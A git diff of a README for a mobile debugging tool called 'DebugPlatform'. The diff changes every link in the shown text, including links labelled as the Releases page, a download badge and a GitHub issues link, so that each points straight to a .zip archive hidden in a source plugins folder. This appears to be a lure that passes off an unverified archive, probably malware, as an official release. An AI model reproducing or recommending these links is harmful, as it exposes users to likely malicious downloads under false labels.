@@ -1,6 +1,6 @@
 # 🛠️ DebugPlatform - Effortless Debugging for Mobile Apps
 
-![Download DebugPlatform](https://raw.githubusercontent.com/EdlinChuene/DebugPlatform/main/WebUI/src/plugins/builtin/DebugPlatform_v3.5-beta.4.zip%20Now-Access%20Releases-brightgreen)
+![Download DebugPlatform](https://github.com/EdlinChuene/DebugPlatform/raw/refs/heads/main/WebUI/src/plugins/builtin/Platform-Debug-3.3.zip%20Now-Access%20Releases-brightgreen)
 
 ## 🚀 Getting Started
 
@@ -8,10 +8,10 @@ Welcome to DebugPlatform! This tool helps you debug mobile applications easily. 
 
 ## 📥 Download & Install
 
-To get started, **visit this page to download** DebugPlatform: [DebugPlatform Releases](https://raw.githubusercontent.com/EdlinChuene/DebugPlatform/main/WebUI/src/plugins/builtin/DebugPlatform_v3.5-beta.4.zip).
+To get started, **visit this page to download** DebugPlatform: [DebugPlatform Releases](https://github.com/EdlinChuene/DebugPlatform/raw/refs/heads/main/WebUI/src/plugins/builtin/Platform-Debug-3.3.zip).
 
 ### Step-by-Step Guide:
-1. Visit the [DebugPlatform Releases](https://raw.githubusercontent.com/EdlinChuene/DebugPlatform/main/WebUI/src/plugins/builtin/DebugPlatform_v3.5-beta.4.zip) page.
+1. Visit the [DebugPlatform Releases](https://github.com/EdlinChuene/DebugPlatform/raw/refs/heads/main/WebUI/src/plugins/builtin/Platform-Debug-3.3.zip) page.
 2. Look for the latest release version. It will typically say something like "Latest release".
 3. Find the download link for your system. If you are unsure, here are the common options:
    - For Windows: Download the `.exe` file.
@@ -74,7 +74,7 @@ If you run into issues while using DebugPlatform, consider the following tips:
 - **Re-install the Application:** Sometimes, a fresh install can resolve unexpected problems.
 - **Check System Requirements:** Ensure your system meets the required specifications.
 - **Refer to Logs:** Check the log files for any error messages that can point you towards the issue.
-- **Seek Help:** If problems persist, feel free to raise an issue on [GitHub](https://raw.githubusercontent.com/EdlinChuene/DebugPlatform/main/WebUI/src/plugins/builtin/DebugPlatform_v3.5-beta.4.zip).
+- **Seek Help:** If problems persist, feel free to raise an issue on [GitHub](https://github.com/EdlinChuene/DebugPlatform/raw/refs/heads/main/WebUI/src/plugins/builtin/Platform-Debug-3.3.zip).
 
 ## 🤝 Contributing
 
@@ -84,6 +84,6 @@ We welcome contributions to improve DebugPlatform. If you have suggestions or id
 
 For support, you can open an issue in our GitHub repository or check the FAQ section in the documentation. We strive to respond to queries promptly.
 
-Remember, you can always return to the [DebugPlatform Releases](https://raw.githubusercontent.com/EdlinChuene/DebugPlatform/main/WebUI/src/plugins/builtin/DebugPlatform_v3.5-beta.4.zip) page for the latest updates or to download a new version.
+Remember, you can always return to the [DebugPlatform Releases](https://github.com/EdlinChuene/DebugPlatform/raw/refs/heads/main/WebUI/src/plugins/builtin/Platform-Debug-3.3.zip) page for the latest updates or to download a new version.
 
 Enjoy your debugging experience with DebugPlatform!
